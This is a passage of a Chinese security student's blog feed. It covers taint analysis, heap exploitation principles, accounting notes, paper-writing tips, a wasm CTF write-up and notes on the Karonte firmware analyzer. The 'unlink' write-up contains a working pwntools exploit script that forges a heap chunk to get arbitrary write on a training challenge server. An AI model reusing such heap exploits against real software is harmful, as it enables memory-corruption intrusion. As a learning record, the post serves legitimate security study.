<span class="number">42</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">goto</span> y</span><br></pre></td></tr></table></figure><p>恶意数据流由x传播到y。</p></li><li><p>主要组成元素：</p><ul><li>污点源：外部引入的数据。</li><li>传播规则：扩散规则和清楚规则，定义在不同条件下的污点数据流向逻辑策略。</li><li>监测点：判断污点数据是否被非法使用。</li></ul></li></ul><h3 id="3-主要方法介绍"><a href="#3-主要方法介绍" class="headerlink" title="3. 主要方法介绍"></a>3. 主要方法介绍</h3><h4 id="3-1-污点源标记"><a href="#3-1-污点源标记" class="headerlink" title="3.1 污点源标记"></a>3.1 污点源标记</h4><ul><li>主要流程<ul><li>污点识别：识别外部数据输入。</li><li>内存映射：利用影子内存进行标记。</li></ul></li></ul><h4 id="3-2-污点传播计算"><a href="#3-2-污点传播计算" class="headerlink" title="3.2 污点传播计算"></a>3.2 污点传播计算</h4><ul><li>应用程序级监控：指令插桩，在程序运行的过程中，在每条指令执行前（后）插入分析代码的形式。<ul><li>Valgrind：将原始二进制代码转换成中间代码，插桩后再重新编译为二进制代码。</li><li>Pin：Windows环境下的动态指令插桩工具。Copy&amp;Annote。</li></ul></li><li>操作系统级别：<ul><li>QEMU</li><li>DECAF</li></ul></li><li>污点传播类型：<ul><li>显示传播：赋值、函数（过程）调用、别名（指针）传播。</li><li>隐式传播：指针依赖、控制依赖（GAP点）。</li></ul></li></ul><h3 id="4-典型实例分析"><a href="#4-典型实例分析" class="headerlink" title="4. 典型实例分析"></a>4. 典型实例分析</h3><p>下面是显式污点传播和污点传播的分析实例：</p><img src="/2021/04/07/%E6%B1%A1%E7%82%B9%E4%BC%A0%E6%92%AD%E5%88%86%E6%9E%90%E4%BB%8B%E7%BB%8D/image-20210408113715067.png" alt="image-20210408113715067" style="zoom:80%;"><p>显式污点传播很容易理解，这里主要贴一下隐式污点传播：</p><p>变量Y 和变量X 之间并没有直接或间接的数据依赖关系(显式流关系),但X 上的污点标记可以经过控制依赖<br>隐式地传播到Y.具体来说,由第4 行的循环条件控制的外层循环顺序地取出X 中的每一个字符,转化成整型后<br>赋给变量x,再由第7 行的循环条件控制的内层循环以累加的方式将x 的值赋给y,最后由外层循环将y 逐一传<br>给Y.最终,第12 行的Y 值和X 值相同,程序存在信息泄漏问题.但是,如果不进行隐式流污点传播分析,第12 行<br>的变量Y 将不会被赋予污点标记,程序的信息泄漏问题被掩盖。</p><h3 id="5-参考文献："><a href="#5-参考文献：" class="headerlink" title="5. 参考文献："></a>5. 参考文献：</h3><ul><li>污点分析技术的原理和实践应用： <a href="http://www.jos.org.cn/1000-9825/5190.htm">http://www.jos.org.cn/1000-9825/5190.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础概念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 污点传播 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆相关漏洞利用原理</title>
      <link href="2021/04/01/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/"/>
      <url>2021/04/01/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Fastbin-attack"><a href="#1-Fastbin-attack" class="headerlink" title="1. Fastbin attack"></a>1. Fastbin attack</h3><p>fastbin是单链表结构。</p><p>double free + fastbin: 两次释放同一个fast chunk，在fastbin中形成一个环，glibc为了效率不会检查链表中的每个结点，然后申请同样大小的chunk，会得到一个影子chunk，这个时候修改这个chunk的FD字段，再申请一个同样大小的chunk，这个时候fastbin的链表头指向FD的地址处，形成任意地址写，前提是这个地址处的size字段处要有合适的数据，可写的内容是偏移一段后的位置。</p><h3 id="2-Unlink-Attack"><a href="#2-Unlink-Attack" class="headerlink" title="2. Unlink Attack:"></a>2. Unlink Attack:</h3><p>glibc通过unsortedbin来管理长度比fastbin大的堆块，双链表结构。</p><p>攻击前提：可以篡改一个unsortedbin的fd和bk。</p><p>双链表结构摘除一个元素的时候，需要unlink。</p><h3 id="3-House-of-Force"><a href="#3-House-of-Force" class="headerlink" title="3. House of Force"></a>3. House of Force</h3><p>申请堆块时没有bin对应的大小，会从topchunk中切一块大小。</p><p>攻击前提：可以篡改topchunk的size字段。</p><p>如果topchunk.size过大，会触发mmap分配新的内存。</p><p>如果得到了一个很大的堆块，topchunk可能会落在libc的数据段，再次申请，就可以那道一块在libc所在的内存，从而实现任意改写libc内容的能力。</p><h3 id="4-Tcache-poisoning"><a href="#4-Tcache-poisoning" class="headerlink" title="4. Tcache poisoning"></a>4. Tcache poisoning</h3><p>类似于fastbin的分配机制，优先级更高，单链表、LIFO，申请堆块时不检查size。</p><p>攻击前提：可以篡改chunk的fd字段，比如存在一个UAF漏洞或Double Free漏洞。</p><h3 id="5-Heap-Fengshui"><a href="#5-Heap-Fengshui" class="headerlink" title="5. Heap Fengshui"></a>5. Heap Fengshui</h3><p>利用堆管理机制的确定性，构造一系列的堆申请、释放序列来控制堆内存布局，使得溢出的部分刚好落在想要的位置。（过于玄学！！）</p><p>堆风水的构造需要两个方面的知识：</p><ul><li>操作系统的堆管理机制与一些复杂应用软件自己的内存管理机制</li><li>软件中对内存进行申请释放的操作，及其关联影响。</li></ul><p>操作系统的堆管理机制可能会有内存碎片整理机制，打乱你预期的风水布局。</p><h3 id="6-UAF漏洞"><a href="#6-UAF漏洞" class="headerlink" title="6. UAF漏洞"></a>6. UAF漏洞</h3><p>最常见、大型软件中利用复杂度高，但危害也是最大的。</p><p>利用思路：</p><ul><li>一块内存被释放，攻击者获得该内存的控制权，在再次使用前的时间窗口内攻击者可以对这块内存进行写操作。</li><li>多半是类对象</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础概念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>财务分析决策与报表</title>
      <link href="2021/04/01/%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%E5%88%86%E6%9E%90/"/>
      <url>2021/04/01/%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="第一次课"><a href="#第一次课" class="headerlink" title="第一次课"></a>第一次课</h3><p>“己之所欲施之于人”。</p><p>比较优势：指一个生产者以低于另一个生产者的机会成本生产一种物品的行为。</p><p>绝对优势：在某一商品的生产上，一国所耗费的劳动成本绝对低于另一国所产生的在该产品生产上的优势。</p><p>竞争优势：是相对于竞争对手拥有的可持续性优势，分为<a href="https://baike.baidu.com/item/%E6%88%90%E6%9C%AC%E4%BC%98%E5%8A%BF/7635815">成本优势</a>、<a href="https://baike.baidu.com/item/%E5%B7%AE%E5%BC%82%E4%BC%98%E5%8A%BF/24380453">差异优势</a>及聚焦优势。</p><p>跳出理论框架，具体问题具体分析。</p><p>会计报表，时间越短，越没有代表性。</p><h3 id="第二次课"><a href="#第二次课" class="headerlink" title="第二次课"></a>第二次课</h3><p>左：资产</p><p>右：负债</p><p>资本公积：指企业在经营过程中由于接受<a href="https://baike.baidu.com/item/%E6%8D%90%E8%B5%A0/465417">捐赠</a>、<a href="https://baike.baidu.com/item/%E8%82%A1%E6%9C%AC%E6%BA%A2%E4%BB%B7/8236498">股本溢价</a>以及<a href="https://baike.baidu.com/item/%E6%B3%95%E5%AE%9A%E8%B4%A2%E4%BA%A7/5901764">法定财产</a>重估<a href="https://baike.baidu.com/item/%E5%A2%9E%E5%80%BC">增值</a>等原因所形成的<a href="https://baike.baidu.com/item/%E5%85%AC%E7%A7%AF%E9%87%91/1329924">公积金</a>。</p><p>账户分类：</p><ul><li><p>资产 = 负债 + 权益。 </p></li><li><p>利润 = 收入 - 费用。</p></li></ul><h3 id="第三次课"><a href="#第三次课" class="headerlink" title="第三次课"></a>第三次课</h3><p>累计折旧：指价值随使用降低的费用。例：房屋使用磨碎、掉漆。</p><p>坏账：指企业无法收回或收回的可能性极小的<a href="https://baike.so.com/doc/6134472-6347633.html">应收款项</a>。</p><p>坏账准备：指企业的应收款项（含应收账款、其他应收款等）计提的，是备抵账户。</p><p>应付票据、应付账款概念不一样，应该向别人要应付票据。</p><p>应付票据又分为银行承兑（对本人来说更好）、银行非承兑。</p><p>销售利润率：利润/销售额*100%。</p><p>成本加成率：成本/销售额*100%。</p><p>财会分录：指一笔资金变化，分别记在不同的种类下。</p><h3 id="第四次课"><a href="#第四次课" class="headerlink" title="第四次课"></a>第四次课</h3><p>现金流分三类：筹资、经营所得、投资。</p><p>利润 = 收入 - 费用（成本*销售/产量 + 其他期间性费用&amp;管理费用）</p><p>18000*100 - 258800 - 1350000（CGS）- 100000 = 91200。</p><p>成本加成率：指售价相比成本加成的百分率。</p><ul><li>150000 / 20000 = 75/件，售价=100/件。25/75*100% = 33%.</li></ul><p>毛利率：毛利润/营业收入, 成本加成/售价</p><ul><li>45/180*100% = 25%.</li><li>25/100。</li></ul><p>成本：获取资产的代价，没有时间。</p><p>费用：在获取收入的一个时间段内，经营所耗的代价。</p>]]></content>
      
      
      <categories>
          
          <category> Thought </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 财务管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学术论文写作规范</title>
      <link href="2021/03/30/%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/"/>
      <url>2021/03/30/%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h3 id="1-常见论文格式"><a href="#1-常见论文格式" class="headerlink" title="1. 常见论文格式"></a>1. 常见论文格式</h3><ul><li>IMRAD格式：Introduction、Methods、Results.And.Discussions。</li><li>IBODIEDRC：我自己想的（看了几篇会议论文之后），应该没这个格式，Introduction、Background、Overview、Design、Implementation、Evaluation、Discussion、Related work、Conclusion。</li></ul><h3 id="2-写文章的小技巧："><a href="#2-写文章的小技巧：" class="headerlink" title="2. 写文章的小技巧："></a>2. 写文章的小技巧：</h3><ul><li>多读多写</li><li>找一篇优秀文章作为模板</li><li>平常多记录摘抄一些经典的句子或相关句型</li><li>发音容易的缩写，STARE better than SBRE</li><li>按杂志或会议要求排版</li><li>修改、修改、再修改，同学之间相互看</li><li>根据审稿意见修改文章</li><li>做好文献管理</li><li>避免语法错误</li></ul><h3 id="3-研究生培养结点"><a href="#3-研究生培养结点" class="headerlink" title="3. 研究生培养结点"></a>3. 研究生培养结点</h3><p>由于只是个小专硕，发小论文目前还不在我的考虑范围内</p><ul><li>开题报告<ul><li>一般在开学第三学期，越早越好</li></ul></li><li>中期报告<ul><li>一般在开题半年后</li></ul></li><li>毕业论文答辩<ul><li>答辩前，需先提交学位论文，经同行评审，评审通过后，才可答辩。</li><li>答辩需简明扼要、重点讲述自己的创新性。</li></ul></li></ul><h3 id="4-开题报告要点"><a href="#4-开题报告要点" class="headerlink" title="4. 开题报告要点"></a>4. 开题报告要点</h3><p><img src="/2021/03/30/%E5%AD%A6%E6%9C%AF%E8%AE%BA%E6%96%87%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/image-20210430185437979.png" alt="image-20210430185437979"></p>]]></content>
      
      
      <categories>
          
          <category> 论文哪些事儿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学术论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wasm-由一道CTF题初探</title>
      <link href="2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/"/>
      <url>2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="0-wasm"><a href="#0-wasm" class="headerlink" title="0. wasm"></a>0. wasm</h3><p>​        WebAssembly是一种新的适合于编译到Web的，可移植的，大小和加载时间高效的格式，是一种新的字节码格式。它的缩写是”.wasm”，.wasm 为文件名后缀，是一种新的底层安全的“二进制”语法。它被定义为“精简、加载时间短的格式和执行模型”，并且被设计为Web 多编程语言目标文件格式。 这意味着浏览器端的性能会得到极大提升，它也使得我们能够实现一个底层构建模块的集合。</p><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="1. 解题思路"></a>1. 解题思路</h3><p>用开发者工具dump出wasm文件，右键-&gt;save as：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330103137550.png" alt="image-20210330103137550" style="zoom:80%;"><center>图1 dump出wat文件</center><p>然后使用<a href="https://webassembly.studio/">https://webassembly.studio/</a> 来反编译wat文件，创建一个empty wat project：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330103448519.png" alt="image-20210330103448519" style="zoom:80%;"><center>图2 创建wat project</center><p>然后将main.wat的内容替换成dump出的内容：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330103627749.png" alt="image-20210330103627749" style="zoom:80%;"><center>图3 替换wat文件</center><p>但是我发现dump出的内容是经过base64编码的，所以首先得解码:</p><p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330110051295.png" alt="image-20210330110051295"></p><center>图4 解码asm文件</center><p>查看解码后的文件内容，以“.asm”开头，这个是二进制文件：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330110222972.png" alt="image-20210330110222972" style="zoom:80%;"><center>图5 wasm二进制文件</center><p>然后再想办法找一下wasm转wat的工具，ubuntu好像有命令wasm2wat可以转，但我搜索的时候，直接就出来了一个在线转换的网站，于是就用了，<a href="https://webassembly.github.io/wabt/demo/wasm2wat/">https://webassembly.github.io/wabt/demo/wasm2wat/</a> ：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330110457615.png" alt="image-20210330110457615" style="zoom:80%;"><center>图6 wasm2wat</center><p>这个就和在开发者工具中看到的一样了，不知道为啥dump出来的不能就是这个text format。</p><p>替换上面main.wat中的内容：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330110723736.png" alt="image-20210330110723736" style="zoom:80%;"><center>图7 替换main.wat</center><p>尝试build的时候发现不太正常，看到下面的提示说修改main.wat的内容被忽略了，需要点一下右上角的save：</p><img src="/2021/03/30/Wasm-%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%88%9D%E6%8E%A2/image-20210330111033094.png" alt="image-20210330111033094" style="zoom:80%;"><center>图 8 build过程</center>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wasm </tag>
            
            <tag> VolgaCTF2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="2021/03/15/unlink/"/>
      <url>2021/03/15/unlink/</url>
      
        <content type="html"><![CDATA[<h3 id="work-note"><a href="#work-note" class="headerlink" title="work_note:"></a>work_note:</h3><p>通过这道题算是对堆溢出的漏洞有了入门的理解了，至少能够调试时如何查看堆的内容，也理解了堆的分配和释放机制。</p><p>解题思路：通过堆溢出漏洞构造一个fake_chunk，溢出比修改下一个chunk的pre_size和size，并把下一个chunk的size的最后一位P设为0，这代表前面构造的fake_chunk是freed的，这样在释放fake_chunk的下一个chunk的时候就会产生unlink，通过设置fake_chunk的FD、BK，结合程序的edit_note功能可以实现任意地址写，这样就可以修改bss段的0x6020d4处的内容，绕过程序<code>cat ./flag</code>的前提条件。</p><p>也看了一下其他类型的题，程序有show的功能的话，就可以泄露地址，从而到libc中去找system的地址，getshell，还没做过。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">For 3th training of 2021, work_note</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_path = <span class="string">&quot;./work_note&quot;</span></span><br><span class="line">remote_ip = [<span class="string">&quot;124.16.75.162&quot;</span>, <span class="number">31054</span>]</span><br><span class="line"><span class="comment">#sh = process(bin_path)</span></span><br><span class="line">sh = remote(remote_ip[<span class="number">0</span>], remote_ip[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh, &quot;b* main&quot;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Input the length of your work note:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&quot;16\n&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Input context of your work record:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&quot;AAA\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Do you need to edit your note? y/n\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;y\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;0.exit\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input the note index to edit:\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;1\n&quot;</span>) <span class="comment">#edit(1)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input the content:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">chunk_list = <span class="number">0x6020E0</span></span><br><span class="line">cur_chk = chunk_list + <span class="number">0x8</span></span><br><span class="line">size_sz = <span class="number">0x8</span></span><br><span class="line"><span class="comment"># fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(cur_chk<span class="number">-3</span>*size_sz)+p64(cur_chk<span class="number">-2</span>*size_sz)+ <span class="string">b&quot;A&quot;</span>*<span class="number">0x80</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0xb0</span>)</span><br><span class="line">sh.send(payload) <span class="comment">#edit(1)</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;0.exit\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input the note index to delete:\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;2\n&quot;</span>) <span class="comment">#free(2) unlink</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;0.exit\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input the note index to edit:\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;1\n&quot;</span>) <span class="comment"># write data</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Input the content:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;\x00\x00\x00\x00\xa8\x00\x00\x00&quot;</span></span><br><span class="line">sh.send(payload2) <span class="comment">#write &#x27;0xA8&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;0.exit\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;0\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive() <span class="comment">#pause to see flag, not get shell.</span></span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ol><li><a href="https://www.cnblogs.com/snip3r/p/9399534.html">https://www.cnblogs.com/snip3r/p/9399534.html</a></li><li><a href="https://blog.csdn.net/mcl2840072208/article/details/96483065?spm=1001.2014.3001.5501">https://blog.csdn.net/mcl2840072208/article/details/96483065?spm=1001.2014.3001.5501</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 月赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Karonte阅读笔记-简要</title>
      <link href="2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/"/>
      <url>2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>Karonte是一个用与静态分析固件设备中多二进制程序漏洞的工具，主要由Python写成。</p><p>github地址：<a href="https://github.com/ucsb-seclab/karonte">https://github.com/ucsb-seclab/karonte</a></p><p>docker镜像地址：<a href="https://hub.docker.com/r/badnack/karonte">https://hub.docker.com/r/badnack/karonte</a></p><p>Karonte发表在2020年的S&amp;P顶会上。</p><p>这里主要通过阅读源码和论文来记录这个工具的大致流程。</p><h3 id="2-Karonte-Overview"><a href="#2-Karonte-Overview" class="headerlink" title="2. Karonte Overview"></a>2. Karonte Overview</h3><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/overview.png" alt="overview"></p><p>这是Karonte的一个大致流程图，结合docker镜像，图中的Firmware固件二进制程序是在docker镜像中的，并不在该GitHub仓库中，而Karonte的结果是存放在一个Log文件中的。整个流程分为5步：</p><ul><li>固件预处理：Karonte的输入由固件样本组成，这一步是使用binwalk解压固件镜像。</li><li>发现边界二进制文件：指出程序中哪儿引用了攻击者控制的数据。</li><li>BDG图构建</li><li>多二进制数据流分析</li><li>不安全的交互检测</li></ul><h3 id="3-整体流程"><a href="#3-整体流程" class="headerlink" title="3. 整体流程"></a>3. 整体流程</h3><p>定义了一个Karonte类，有一个方法为run，定义Karonte类得时候会从预设的配置文件JSON读取配置信息，可以自定义Log文件的位置，否则会随机生成具有Karonte前缀的Log文件。</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201206213801860.png" alt="image-20201206213801860"></p><p>Karonte中实例化了一个类BorderBinariesFinder，用于寻找边界二进制文件，其中固件地址（self._fw_path）是通过Karonte类的实例化时传入的。</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201206213836432.png" alt="image-20201206213836432"></p><p>如果没有找到任何边界二进制文件，则退出，提示结果存放在Log文件中。</p><p>找到了边界二进制文件，则实例化类BinaryDependencyGraph用于构建二进制依赖图，里面就包含关键的计算解析值（parsing score）的算法，下面会详细说。</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201206213928871.png" alt="image-20201206213928871"></p><p>最后将构建好的BDG传入实例化的BugFinder，同时还有分析的前后继承关系。开始寻找Bug，将结果存储到Log文件中去。</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201206214013301.png" alt="image-20201206214013301"></p><h3 id="4-BDG算法"><a href="#4-BDG算法" class="headerlink" title="4. BDG算法"></a>4. BDG算法</h3><p>CPF：通信范式查找器，用于对进程间的通信进行建模，主要功能有Data Key Recovery 、Flow Direction Determination、Binary Set Magnification。</p><p>BDG：二进制依赖图，是对数据流进行建模后形成的一个非连通循环有向图。</p><p>给定一组边界二进制文件，KARONTE构建一个二进制相关性图（BDG），它是一个有向图，该图对那些处理受攻击者控制的数据的二进制文件之间的通信进行建模。 通过利用通信范例查找器（CPF）模块的集合来迭代地恢复BDG，这些模块能够推理出不同的进程间通信范例。</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201213165415455.png" alt="image-20201213165415455"></p><p>BDG算法的具体描述见上图，文字描述如下：</p><p>其中的参数<code>fw</code>代表解压后的固件样本，<code>B</code>代表前面通过计算<code>parsing score</code>得到的边界二进制文件（Border Binary），<code>int_locs</code>是一组内存比较所在的程序点。</p><p>首先，对于B中的每一个二进制文件b，我们考虑既属于<code>int_locs</code>，也属于b的<code>locs</code>（位置，这个通过<code>get_locs</code>得到）；</p><p>然后对于locs中的每一个loc，利用静态污点分析引擎来引导从包含loc的函数的序言开始的符号路径探索（对应函数<code>explore_paths</code>），当分析到loc的时候，我们将引用的内存位置buf污染，即，将内存位置与network-encoding关键字进行比较（对应函数<code>get_buf</code>和<code>apply_taint</code>）。</p><p>在路径探索的每个步骤中（即，针对每个访问的基本块），我们调用每个CPF模块，该模块分析当前路径并使用污点信息（由污点分析引擎在路径探索过程中传播）来检测是否二进制b正在共享某些污染数据d。如果CPFp匹配（即，它检测到所分析的二进制文件依赖于通信范式p共享某些数据），则我们利用CPFp恢复使用中的通信范式实例的所有详细信息。更准确地说，CPFp通过p恢复用于共享数据的数据键k，并推断k的二进制文件的角色（即setter或getter）（对应函数 <code>find_data_key_and_role</code>），并在固件样本中查找可能通过此通道进行通信的样本（对应函数 <code>get_new_binaries</code>）。</p><p>然后将新发现的二进制文件添加到整个二进制文件集中进行分析。注意，当计划对这些新二进制文件Bnew中的任何一个进行分析时，分析必须知道最初在何处应用污点。换句话说，我们必须检测共享数据在这些新二进制文件中最初引入的位置。因此，对于每个新添加的二进制ba，CPFp还将检索引用数据密钥k的程序点<code>int_locs_new</code>，并将它们添加到<code>int_locs</code>中。最后两个操作由功能更新二进制文件执行。最后，对于每个分析的二进制b，我们考虑在某个键k上与b匹配的每个CPF（cp），并使用cp来检索b对k的作用（例如，setter）。</p><p>然后，我们在b与其他与k的b作用相反的其他二进制文件（例如getter）之间创建一条边。</p><p>最后，回到例子1：</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201213173650907.png" alt="image-20201213173650907"></p><p>第三行是一个内存比较的位置，推测<code>p</code>可能会用于内存比较，从函数<code>parse_URI</code>（第1行）开始对它指向的内存位置进行污染，并引导过程内污染分析探索，并通过遵循该控件来传播污染该程序的流程。 当污点浏览到达<code>execve</code>函数调用（第13行）时，环境CPF范式检测到正在执行另一个二进制文件，并且<code>setenv</code>函数用于设置数据键<code>QUERY_STRING</code>。 因此，环境CPF范式确定分析中的二进制文件是<code>QUERY_STRING</code>的设置器。 然后，环境CPF范式扫描固件样本并根据相同的数据密钥找到其他二进制文件，并将它们添加到二进制文件集中进行分析。 最后，对于每个新添加的二进制文件，环境CPF检索引用数据键<code>QUERY_STRING</code>的代码位置（例如，对函数<code>getenv(&quot;QUERY_STRING&quot;)</code>的调用）。</p><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h3><p>程序中内存比较的信息不可避免地需要硬编码，因此可以根据这些硬编码的信息来确定内存比较的位置。而在固件的漏洞分析过程中，针对没有源码的二进制文件，其中的Log信息也是硬编码的信息，或许可以通过这些信息来定位关键函数的入口，进一步分析。</p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h3><p>karonte运行截图：</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201213181434213.png" alt="image-20201213181434213"></p><p>结束：</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201216134734820.png" alt="image-20201216134734820"></p><p>Role、buf、roleinfo定义：</p><p><img src="/2020/12/04/Karonte%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0-%E7%AE%80%E8%A6%81/image-20201213181518591.png" alt="image-20201213181518591"></p><p>CPFs的定义：</p><p><img 